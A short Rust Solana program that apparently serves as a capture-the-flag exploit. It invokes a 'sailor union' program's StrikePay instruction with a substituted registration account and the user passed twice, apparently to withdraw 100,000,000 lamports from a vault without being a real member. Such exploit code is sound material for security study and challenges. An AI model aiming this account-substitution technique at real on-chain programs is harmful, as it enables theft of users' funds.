use borsh::{BorshSerialize, BorshDeserialize};

use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::invoke,
    pubkey::Pubkey,
    system_program,
};

#[derive(Debug, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum SailorInstruction {
    CreateUnion {bal: u64},
    PayDues {amt: u64},
    StrikePay {amt: u64},
    RegisterMember {member: [u8; 32]},
}

pub fn process_instruction(
    _program: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let sailor_program = next_account_info(account_iter)?;
    let user = next_account_info(account_iter)?;
    let vault = next_account_info(account_iter)?;
    let sailor_union = next_account_info(account_iter)?;
    let registration = next_account_info(account_iter)?;
    let rich_boi = next_account_info(account_iter)?;
    let sys_prog_account = next_account_info(account_iter)?;

    invoke(
        &Instruction {
            program_id: *sailor_program.key,
            accounts: vec![
                AccountMeta::new(*registration.key, false),
                AccountMeta::new(*user.key, false),
                AccountMeta::new(*user.key, true),
                AccountMeta::new(*vault.key, false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: SailorInstruction::StrikePay { amt: 100_000_000_u64 }
                .try_to_vec()
                .unwrap(),
        },
        &[
            registration.clone(),
            user.clone(),
            user.clone(),
            vault.clone(),
            sys_prog_account.clone(),
        ],
    )?;

    Ok(())
}
